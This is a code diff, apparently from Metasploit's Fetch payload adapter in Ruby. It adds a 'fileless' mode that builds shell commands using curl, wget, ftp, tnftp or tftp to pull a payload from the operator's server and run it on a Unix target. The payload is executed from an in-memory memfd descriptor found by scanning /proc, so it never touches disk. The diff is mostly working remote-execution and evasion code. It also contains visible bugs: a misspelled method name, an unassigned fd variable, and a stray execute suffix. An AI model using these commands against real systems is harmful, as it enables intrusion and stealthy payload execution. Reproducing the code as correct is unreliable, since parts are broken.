@@ -1,16 +1,16 @@
 module Msf::Payload::Adapter::Fetch
-
   def initialize(*args)
     super
     register_options(
       [
         Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
-        Msf::OptString.new('FETCH_FILENAME', [ false, 'Name to use on remote system when storing payload; cannot contain spaces or slashes', Rex::Text.rand_text_alpha(rand(8..12))], regex: /^[^\s\/\\]*$/),
+        Msf::OptBool.new('FETCH_FILELESS', [true, 'Attempt to run payload without touching disk (only Unix)', false]),
+        Msf::OptString.new('FETCH_FILENAME', [ false, 'Name to use on remote system when storing payload; cannot contain spaces or slashes', Rex::Text.rand_text_alpha(rand(8..12))], regex: %r{^[^\s/\\]*$}),
         Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
         # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
         Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ !options['LHOST']&.required, 'Local IP to use for serving payload']),
         Msf::OptString.new('FETCH_URIPATH', [ false, 'Local URI to use for serving payload', '']),
-        Msf::OptString.new('FETCH_WRITABLE_DIR', [ true, 'Remote writable dir to store payload; cannot contain spaces', ''], regex:/^[\S]*$/)
+        Msf::OptString.new('FETCH_WRITABLE_DIR', [ true, 'Remote writable dir to store payload; cannot contain spaces', ''], regex: /^\S*$/)
       ]
     )
     register_advanced_options(
@@ -94,15 +94,16 @@ module Msf::Payload::Adapter::Fetch
     #
     case datastore['FETCH_COMMAND'].upcase
     when 'FTP'
-      return _generate_ftp_command
+      return datastore['FETCH_FILELESS'] && !windows? ? _generate_ftp_command_fileless : _generate_ftp_command
     when 'TNFTP'
-      return _generate_tnftp_command
+      return datastore['FETCH_FILELESS'] && !windows? ? _generate_tnftp_command_fileless : _generate_tnftp_command
     when 'WGET'
-      return _generate_wget_command
+      return datastore['FETCH_FILELESS'] && !windows? ? _generate_wget_command_fileless : _generate_wget_command
     when 'CURL'
-      return _generate_curl_command
+      return datastore['FETCH_FILELESS'] && !windows? ? _generate_curl_command_fileless : _generate_curl_command
     when 'TFTP'
-      return _generate_tftp_command
+      return datastore['FETCH_FILELESS'] && !windows? ? _generate_tftp_command_fileless : _generate_tftp_command
+    # ignoring certutil
     when 'CERTUTIL'
       return _generate_certutil_command
     else
@@ -143,11 +144,13 @@ module Msf::Payload::Adapter::Fetch
 
   def srvuri
     return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
+
     default_srvuri
   end
 
   def windows?
     return @windows unless @windows.nil?
+
     @windows = platform.platforms.first == Msf::Module::Platform::Windows
     @windows
   end
@@ -177,14 +180,14 @@ module Msf::Payload::Adapter::Fetch
       comm = ::Rex::Socket::Comm::Local
     when /\A-?[0-9]+\Z/
       comm = framework.sessions.get(srv_comm.to_i)
-      raise(RuntimeError, "Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
-      raise(RuntimeError, "Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
+      raise("Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
+      raise("Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
     when nil, ''
       unless ip.nil?
         comm = Rex::Socket::SwitchBoard.best_comm(ip)
       end
     else
-      raise(RuntimeError, "SocketServer Comm '#{srv_comm}' is invalid")
+      raise("SocketServer Comm '#{srv_comm}' is invalid")
     end
 
     comm || ::Rex::Socket::Comm::Local
@@ -192,6 +195,7 @@ module Msf::Payload::Adapter::Fetch
 
   def _execute_add
     return _execute_win if windows?
+
     return _execute_nix
   end
 
@@ -202,17 +206,16 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix
-    	if datastore['FETCH_DELETE']
-		fd = rand(3..7)
-		#create anonymous file ? -> /proc/$pid/fd/$fd
-		cmds = ';tmpfile=$(mktemp);exec #{fd}<> "$tmpfile"; rm -f "$tmpfile"'
-		
+    if datastore['FETCH_DELETE']
+      rand(3..7)
+      # create anonymous file ? -> /proc/$pid/fd/$fd
+      cmds = %{;tmpfile=$(mktemp);exec #{fd}<> "$tmpfile"; rm -f "$tmpfile"}
 
-	else
-		cmds = ";chmod +x #{_remote_destination_nix}"
-		cmds << ";#{_remote_destination_nix}&"
-	end
-    #cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
+    else
+      cmds = ";chmod +x #{_remote_destination_nix}"
+      cmds << ";#{_remote_destination_nix}&"
+    end
+    # cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
     cmds
   end
 
@@ -230,44 +233,30 @@ module Msf::Payload::Adapter::Fetch
     end
     cmd + _execute_add
   end
-   
-  def _generate_fileless
-	
-	case fetch_protocol
-	when 'HTTP'
-	      	get_file_cmd = "curl http://#{download_uri}"
-	when 'HTTPS'
-	     	get_file_cmd = "curl https://#{download_uri}"
-	when 'TFTP'
-	      	get_file_cmd = "curl tftp://#{download_uri}"
-	else
-	      	fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
-	end
-	
-	#get list of all $USER's processes
-	cmd = "FOUND=0"
-	cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
-	#already found anonymous file where we can write
-	cmd << "; do if [[ $FOUND -eq 0 ]]"
-	
-	#look for every symbolic link with write rwx permissions 
-	#if found one, try to download payload into the anonymous file
-	#and execute it
-	cmd << "; then while read f"
-	cmd << "; do if [[ $(ls -al $f | grep -o memfd | wc -l) == 1 ]]"
-	cmd << "; then #{get_file_cmd} > $f"
-	cmd << "; $f"
-	cmd << "; FOUND=1"
-	cmd << "; break"
-	cmd << "; fi"
-	cmd << "; done <<< $(find /proc/$i/fd -type l -perm u=rwx)"
-	cmd << ";fi"
-	cmd << "done"
-	
-	cmd
-	
-end		
-	
+
+  def _generate_fileless(get_file_cmd)
+    # get list of all $USER's processes
+    cmd = 'FOUND=0'
+    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
+    # already found anonymous file where we can write
+    cmd << '; do if [[ $FOUND -eq 0 ]]'
+
+    # look for every symbolic link with write rwx permissions
+    # if found one, try to download payload into the anonymous file
+    # and execute it
+    cmd << '; then while read f'
+    cmd << '; do if [[ $(ls -al $f | grep -o memfd | wc -l) == 1 ]]'
+    cmd << "; then #{get_file_cmd} $f"
+    cmd << '; $f'
+    cmd << '; FOUND=1'
+    cmd << '; break'
+    cmd << '; fi'
+    cmd << '; done <<< $(find /proc/$i/fd -type l -perm u=rwx)'
+    cmd << '; fi'
+    cmd << '; done'
+
+    cmd
+  end
 
   def _generate_curl_command
     case fetch_protocol
@@ -283,17 +272,45 @@ end
     cmd + _execute_add
   end
 
-  def _generate_ftp_command
+  def _generate_curl_command_fileless
     case fetch_protocol
-    when 'FTP'
-      cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
     when 'HTTP'
-      cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
+      fetch_command = "curl http://#{download_uri} -so"
     when 'HTTPS'
-      cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
+      fetch_command = "curl https://#{download_uri} -sko"
+    when 'TFTP'
+      fetch_command = "curl tftp://#{download_uri} -so"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
+    _generate_fileless(fetch_command)
+  end
+
+  def _generate_ftp_command
+    case fetch_protocol
+    when 'FTP'
+      "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
+    when 'HTTP'
+      "ftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
+    when 'HTTPS'
+      "ftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+  end
+
+  def _generate_ftp_command_filess
+    case fetch_protocol
+    when 'FTP'
+      fetch_command = "ftp ftp://#{download_uri} -Vo"
+    when 'HTTP'
+      fetch_command = "ftp http://#{download_uri} -Vo"
+    when 'HTTPS'
+      fetch_command = "ftp https://#{download_uri}#{_execute_nix} -Vo"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+    _generate_fileless(fetch_command)
   end
 
   def _generate_tftp_command
@@ -312,17 +329,43 @@ end
     cmd
   end
 
-  def _generate_tnftp_command
+  def _generate_tftp_command_fileless
+    _check_tftp_port
     case fetch_protocol
-    when 'FTP'
-      cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
-    when 'HTTP'
-      cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
-    when 'HTTPS'
-      cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
+    when 'TFTP'
+      _check_tftp_file
+      cmd = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
+    cmd
+  end
+
+  def _generate_tnftp_command
+    case fetch_protocol
+    when 'FTP'
+      "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
+    when 'HTTP'
+      "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
+    when 'HTTPS'
+      "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+  end
+
+  def _generate_tnftp_command_fileless
+    case fetch_protocol
+    when 'FTP'
+      fetch_command = "tnftp ftp://#{download_uri} -Vo"
+    when 'HTTP'
+      fetch_command = "tnftp http://#{download_uri} -Vo"
+    when 'HTTPS'
+      fetch_command = "tnftp https://#{download_uri} -Vo"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+    _generate_fileless(fetch_command)
   end
 
   def _generate_wget_command
@@ -337,13 +380,27 @@ end
     cmd + _execute_add
   end
 
+  def _generate_wget_command_fileless
+    case fetch_protocol
+    when 'HTTPS'
+      fetch_command = "wget --no-check-certificate https://#{download_uri} -qO"
+    when 'HTTP'
+      fetch_command = "wget http://#{download_uri} -qO"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+    _generate_fileless(fetch_command)
+  end
+
   def _remote_destination
     return _remote_destination_win if windows?
+
     return _remote_destination_nix
   end
 
   def _remote_destination_nix
     return @remote_destination_nix unless @remote_destination_nix.nil?
+
     writable_dir = datastore['FETCH_WRITABLE_DIR']
     writable_dir = '.' if writable_dir.blank?
     writable_dir += '/' unless writable_dir[-1] == '/'
@@ -356,12 +413,13 @@ end
 
   def _remote_destination_win
     return @remote_destination_win unless @remote_destination_win.nil?
+
     writable_dir = datastore['FETCH_WRITABLE_DIR']
     writable_dir += '\\' unless writable_dir.blank? || writable_dir[-1] == '\\'
     payload_filename = datastore['FETCH_FILENAME']
     payload_filename = srvuri if payload_filename.blank?
     payload_path = writable_dir + payload_filename
-    payload_path = payload_path + '.exe' unless payload_path[-4..-1] == '.exe'
+    payload_path += '.exe' unless payload_path[-4..] == '.exe'
     @remote_destination_win = payload_path
     @remote_destination_win
   end
